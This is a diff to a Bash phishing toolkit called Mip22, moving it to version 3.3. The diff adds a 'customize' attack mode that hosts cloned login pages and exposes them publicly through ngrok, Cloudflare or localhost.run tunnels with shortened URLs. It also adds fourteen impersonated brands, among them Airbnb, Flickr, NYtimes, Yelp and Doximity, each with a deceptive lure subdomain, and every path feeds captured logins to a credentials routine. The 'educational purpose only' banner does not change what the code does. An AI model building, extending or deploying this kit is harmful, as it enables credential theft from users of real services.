@@ -159,11 +159,10 @@ ${BLUE}  ██║██║╚██╔╝██║██╔═══╝ ██�
 ${BLUE}  ██║██║ ╚═╝ ██║██║     ╚██████╔╝███████║███████║██║██████╔╝███████╗███████╗███████║   dP   dP
 ${BLUE}  ═╝╚═╝     ╚═╝╚═╝      ╚═════╝ ╚══════╝╚══════╝╚═╝╚═════╝ ╚══════╝╚══════╝╚══════╝   d888 d888 
 ${BLUE}                                                                                         
-        ${CYAN}Mip22 tool made for educational purpose only. 	${ORANGE}Version: 3.0  
+        ${CYAN}Mip22 tool made for educational purpose only. 	${ORANGE}Version: 3.3  
         ${CYAN}The author is not responsible for any malicious use of the program.
 		${CYAN}        Mip Created by ${ORANGE}makdosx ${CYAN}(https://github.com/makdosx) ${WHITE}
 	
-
 	EOF
 
 	printf "${RESETBG}"	
@@ -226,6 +225,19 @@ setup_clone_manual() {
    echo -ne "\n${GREEN}[${WHITE}-${GREEN}]${BLUE} Starting your php server..."${WHITE}
    cd .www && php -S "$host":"$port" > /dev/null 2>&1 & 	
 }
+
+
+
+setup_clone_customize(){
+	
+    # Setup cloned page and server
+	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${BLUE} Setting up cloned page..."${WHITE}
+	rm -rf .www/*
+	cp -rf .customize/"$site"/* .www
+	echo -ne "\n${GREEN}[${WHITE}-${GREEN}]${BLUE} Starting your php server..."${WHITE}
+	cd .www && php -S "$host":"$port" > /dev/null 2>&1 & 
+}
+
 
 
 
@@ -361,7 +373,18 @@ localhost_start() {
 
 
 
-# Localhost Start
+# Localhost Start customize
+localhost_customize() {
+	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Initializing... ${GREEN}( ${CYAN}http://$host:$port ${GREEN})"
+	setup_clone_customize
+	{ sleep 1; clear; header; }
+	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Successfully Hosted in : ${GREEN}${CYAN}http://$host:$port ${GREEN}"
+	credentials
+}
+
+
+
+# Localhost Start manual
 localhost_start_manual() {
 	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Initializing... ${GREEN}( ${CYAN}http://$host:$port ${GREEN})"
 	setup_clone_manual
@@ -484,8 +507,38 @@ ngrok_start() {
 
 
 
+# Start ngrok customize
+ngrok_start_customize() {
+	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Initializing... ${MAGENTA}( ${CYAN}http://$host:$port ${MAGENTA})"
+	{ sleep 1; setup_clone_customize; }
+	echo -ne "\n\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Launching Ngrok..."
 
-# Start ngrok
+    if [[ `command -v termux-chroot` ]]; then
+        sleep 2 && termux-chroot ./.host/ngrok http "$host":"$port" > /dev/null 2>&1 &
+    else
+        sleep 2 && ./.host/ngrok http "$host":"$port" > /dev/null 2>&1 &
+    fi
+
+	{ sleep 9; clear; header; }
+	
+	ngrok_url=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[-0-9a-z]*\.ngrok.io")
+	ngrok_url1=${ngrok_url#https://}
+	
+    url_short=$(curl -s 'https://is.gd/create.php?format=simple&url='"$ngrok_url1")
+	
+	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${WHITE} URL http : ${GREEN}http://$ngrok_url1"
+	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${WHITE} URL http(s) : ${GREEN}$ngrok_url"
+	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${WHITE} URL subdomain : ${GREEN}$subdomain@$ngrok_url1"
+	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${WHITE} URL shortener : ${GREEN}$url_short"
+	
+	credentials
+}
+
+
+
+
+
+# Start ngrok manual
 ngrok_start_manual() {
 	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Initializing... ${MAGENTA}( ${CYAN}http://$host:$port ${MAGENTA})"
 	{ sleep 1; setup_clone_manual; }
@@ -517,7 +570,6 @@ ngrok_start_manual() {
 
 
 # Start Cloudflared
-# 
 cloudflared_start() { 
 	
 	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Initializing... ${MAGENTA}( ${CYAN}http://$host:$port ${GREEN})"
@@ -549,8 +601,39 @@ cloudflared_start() {
 
 
 
-# Start Cloudflared
-# 
+# Start Cloudflared customize
+cloudflared_start_customize() { 
+	
+	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Initializing... ${MAGENTA}( ${CYAN}http://$host:$port ${GREEN})"
+	{ sleep 1; setup_clone_customize; }
+	echo -ne "\n\n${GREEN}[${WHITE}-${GREEN}]${MAGETNA} Launching Cloudflared..."
+
+    if [[ `command -v termux-chroot` ]]; then
+		sleep 2 && termux-chroot ./.host/cloudflared tunnel -url "$host":"$port" > .tunnels_log/.cloudfl.log  2>&1 & > /dev/null 2>&1 &
+    else
+        sleep 2 && ./.host/cloudflared tunnel -url "$host":"$port" > .tunnels_log/.cloudfl.log  2>&1 & > /dev/null 2>&1 &
+    fi
+
+	{ sleep 12; clear; header; }
+	
+	cldflr_url=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".tunnels_log/.cloudfl.log")
+	cldflr_url1=${cldflr_url#https://}
+	
+	url_short=$(curl -s 'https://is.gd/create.php?format=simple&url='"$cldflr_url1")
+	
+	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${WHITE} URL http : ${GREEN}http://$cldflr_url1"
+	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${WHITE} URL http(s) : ${GREEN}$cldflr_url"
+	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${WHITE} URL subdomain : ${GREEN}$subdomain@$cldflr_url1"
+	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${WHITE} URL shortener : ${GREEN}$url_short"
+	
+	credentials
+}
+
+
+
+
+
+# Start Cloudflared manual
 cloudflared_start_manual() { 
 	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Initializing... ${MAGENTA}( ${CYAN}http://$host:$port ${GREEN})"
 	{ sleep 1; setup_clone_manual; }
@@ -612,7 +695,37 @@ localhostrun_start() {
 
 
 
-# Start localrun
+# Start localrun customize
+localhostrun_start_customize() {
+	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Initializing... ${MAGENTA}( ${CYAN}http://$host:$port ${MAGENTA})"
+	{ sleep 1; setup_clone_customize; }
+	echo -ne "\n\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Launching LocalhostRun..."
+
+    if [[ `command -v termux-chroot` ]]; then
+        sleep 2 && termux-chroot ssh -R "80":"$host":"$port" "nokey@localhost.run" > .tunnels_log/.localrun.log  2>&1 & > /dev/null 2>&1 &
+    else
+        sleep 2 && ssh -R "80":"$host":"$port" "nokey@localhost.run" > .tunnels_log/.localrun.log  2>&1 & > /dev/null 2>&1 &
+    fi
+
+	{ sleep 9; clear; header; }
+	
+	localrun_url=$(grep -o 'https://[-0-9a-z]*\.lhrtunnel.link' ".tunnels_log/.localrun.log")
+	localrun_url1=${localrun_url#https://}
+	
+	url_short=$(curl -s 'https://is.gd/create.php?format=simple&url='"$localrun_url1")
+	
+    echo -e "\n${GREEN}[${WHITE}-${GREEN}]${WHITE} URL http : ${GREEN}http://$localrun_url1"
+	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${WHITE} URL https(s) : ${GREEN}$localrun_url"
+	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${WHITE} URL subdomain : ${GREEN}$subdomain@$localrun_url1"
+	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${WHITE} URL shortener : ${GREEN}$url_short"
+	
+	credentials
+}
+
+
+
+
+# Start localrun manual
 localhostrun_start_manual() {
 	echo -e "\n${GREEN}[${WHITE}-${GREEN}]${MAGENTA} Initializing... ${MAGENTA}( ${CYAN}http://$host:$port ${MAGENTA})"
 	{ sleep 1; setup_clone_manual; }
@@ -683,6 +796,49 @@ tunnel() {
 
 
 
+
+# Select Tunnel customize 
+tunnel_customize() {
+	{ clear; header; }
+	cat <<- EOF
+
+		${GREEN}[${WHITE}1${GREEN}]${CYAN} Localhost ${MAGENTA} (for practise only)
+		${GREEN}[${WHITE}2${GREEN}]${CYAN} LocalhostRun ${MAGENTA} (alternative)  
+		${GREEN}[${WHITE}3${GREEN}]${CYAN} Cloudflared ${MAGENTA} (recommended)
+		${GREEN}[${WHITE}4${GREEN}]${CYAN} Ngrok ${MAGENTA} (first install token from menu)
+
+	EOF
+
+	read -p "${GREEN}[${WHITE}-${GREEN}]${GREEN} Select a port forwarding service : ${WHITE}"
+
+	case $REPLY in 
+		   1)
+		    localhost_start_customize;;
+		    
+		   2)
+		    localhostrun_start_customize;; 
+			
+		   3)
+			cloudflared_start_customize;;
+			
+		   4)
+			ngrok_start_customize;;
+		   	
+			
+		  *)
+			echo -ne "\n${GREEN}[${WHITE}!${GREEN}]${RED} Invalid Option, Try Again..."
+			{ sleep 1; header; tunnel_customize;};;
+	esac
+
+}
+
+
+
+
+
+
+
+
 start_manual_method() {
  
  cd .manual_attack && php -S "127.0.0.1:8081" > /dev/null 2>&1 & 
@@ -726,7 +882,7 @@ tunnel_manual() {
 			
 		  *)
 			echo -ne "\n${GREEN}[${WHITE}!${GREEN}]${RED} Invalid Option, Try Again..."
-			{ sleep 1; header; tunnel;};;
+			{ sleep 1; header; tunnel_manual;};;
 	esac
 
 }
@@ -1291,7 +1447,7 @@ attack() {
 	        other_sites;;
 	        
 	        
-	   99) menu;;
+	   99)  menu;;
 	    
 	        
 	   *)
@@ -1310,14 +1466,23 @@ other_sites() {
  
  { clear; header; echo; }
 
-	cat <<- EOF
+   	cat <<- EOF
 		${GREEN}[${WHITE}1${GREEN}]${CYAN} Freefire
 		${GREEN}[${WHITE}2${GREEN}]${CYAN} Roblox
+		${GREEN}[${WHITE}3${GREEN}]${CYAN} Academia
+		${GREEN}[${WHITE}4${GREEN}]${CYAN} Airbnb
+		${GREEN}[${WHITE}5${GREEN}]${CYAN} Bigmuscle
+		${GREEN}[${WHITE}6${GREEN}]${CYAN} Doximity
+		${GREEN}[${WHITE}7${GREEN}]${CYAN} Flickr
+		${GREEN}[${WHITE}8${GREEN}]${CYAN} Hi5
+		${GREEN}[${WHITE}9${GREEN}]${CYAN} Issue
+		${GREEN}[${WHITE}10${GREEN}]${CYAN} NYtimes
+		${GREEN}[${WHITE}11${GREEN}]${CYAN} Pokemon Trainer
+		${GREEN}[${WHITE}12${GREEN}]${CYAN} WTsocial
+		${GREEN}[${WHITE}13${GREEN}]${CYAN} Yammer
+		${GREEN}[${WHITE}14${GREEN}]${CYAN} Yelp
 		${GREEN}[${WHITE}99${GREEN}]${MAGENTA} Main Menu                                         
 		                                                       
-
-		
-		
 	EOF
 	
 	
@@ -1336,7 +1501,78 @@ other_sites() {
 			subdomain='http://get-free-character-for-roblox-game'
 			tunnel;;
 				
-	        
+	   
+	    3)
+			site="academia"
+			subdomain='http://academia-account-update-plan-free'
+			tunnel;;
+	   
+	   
+	    4)
+			site="airbnb"
+			subdomain='http://airbnb-account-upgrade-plan-free'
+			tunnel;;
+	   
+	   
+	    5)
+			site="bigmuscle"
+			subdomain='http://bigmuscle-account-update-plan-free'
+			tunnel;;
+	           
+	           
+	    6)
+			site="doximity"
+			subdomain='http://doximity-account-update-plan-free'
+			tunnel;;
+	  
+	  
+	    7)
+			site="flickr"
+			subdomain='http://flickr-account-upgrade-plan-pro-free'
+			tunnel;;
+	           
+	           
+	    8)
+			site="hi5"
+			subdomain='http://hi5-account-secure-login'
+			tunnel;;
+	           
+	    
+	    9)
+			site="issue"
+			subdomain='http://flickr-account-upgrade-plan-pro-free'
+			tunnel;;
+	           
+	    
+	    10)
+			site="nytimes"
+			subdomain='http://nytimes-account-upgrade-to-pro-free'
+			tunnel;;
+	           
+	    
+	    11)
+			site="pokemon"
+			subdomain='http://pokemon-update-account-plan-free'
+			tunnel;;
+	            
+	            
+	    12)
+			site="wtsocial"
+			subdomain='http://wtsocial-secure-login'
+			tunnel;;
+	   
+	   
+	    13)
+			site="yammer"
+			subdomain='http://yammer-secure-login'
+			tunnel;;       
+	     
+	     
+	    14)
+			site="yelp"
+			subdomain='http://yelp-secure-login'
+			tunnel;;
+	           
 	        
 	   99) menu;;
 	    
@@ -1351,6 +1587,51 @@ other_sites() {
 }
 
 
+
+
+
+customize_sites()
+{
+	
+ { clear; header; echo; }	
+ 
+   
+echo -ne "\n${MAGENTA}Customize your site. 
+${GREEN}Go inside the .customize folder \nand create your own customized sites inside folders.
+Place all your files inside the same folder. 
+For example folder mysite and inside all files. 
+Then just type the folder name and choose tunnel. \n\n"
+    
+     
+cat <<- EOF
+        
+${GREEN}[${WHITE}1${GREEN}]${CYAN} Customized 
+${GREEN}[${WHITE}99${GREEN}]${CYAN} Main Menu
+		
+EOF
+	
+    read -p "${GREEN}[${WHITE}-${GREEN}]${GREEN} Select an option : ${WHITE}"${WHITE}
+
+	case $REPLY in 
+	    
+	    1) 
+	      read -p ${CYAN}"Enter folder name e.x mysite: "${WHITE} customize_folder
+	      read -p ${CYAN}"Enter subdomain for tunnel e.x mysite-update-plan-premium-free: "${WHITE} customize_subdomain
+	      site=$customize_folder
+	      subdomain=$customize_subdomain
+	      tunnel_customize;;
+
+	    
+	    99) 
+	       menu;; 
+	    
+	    *)
+			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
+			{ sleep 0.7; attack_customize;};;
+	  
+	esac
+	
+}
 
 
 
@@ -1412,10 +1693,11 @@ menu() {
 	cat <<- EOF
 		${GREEN}[${WHITE}1${GREEN}]${CYAN} Attack Default
 		${GREEN}[${WHITE}2${GREEN}]${CYAN} Attack Manual
-		${GREEN}[${WHITE}3${GREEN}]${CYAN} Apis
-		${GREEN}[${WHITE}4${GREEN}]${CYAN} Email
-		${GREEN}[${WHITE}5${GREEN}]${CYAN} Vpn
-		${GREEN}[${WHITE}6${GREEN}]${CYAN} Sound (pc only)
+		${GREEN}[${WHITE}3${GREEN}]${CYAN} Attack Customize
+		${GREEN}[${WHITE}4${GREEN}]${CYAN} Apis
+		${GREEN}[${WHITE}5${GREEN}]${CYAN} Email
+		${GREEN}[${WHITE}6${GREEN}]${CYAN} Vpn
+		${GREEN}[${WHITE}7${GREEN}]${CYAN} Sound (pc only)
 		${GREEN}[${WHITE}0${GREEN}]${ORANGE} Exit
 		
 		
@@ -1428,14 +1710,16 @@ menu() {
 	    1) attack;; 
 	    
 	    2) attack_manual;; 
+	    
+	    3) customize_sites;;
 	      			
-	    3) apis;;
+	    4) apis;;
 	    
-	    4) email;;
+	    5) email;;
 	    
-	    5) vpn_setup;;
+	    6) vpn_setup;;
 	    
-	    6) play_music;;
+	    7) play_music;;
 	    
 	    help) help;;
 	      				
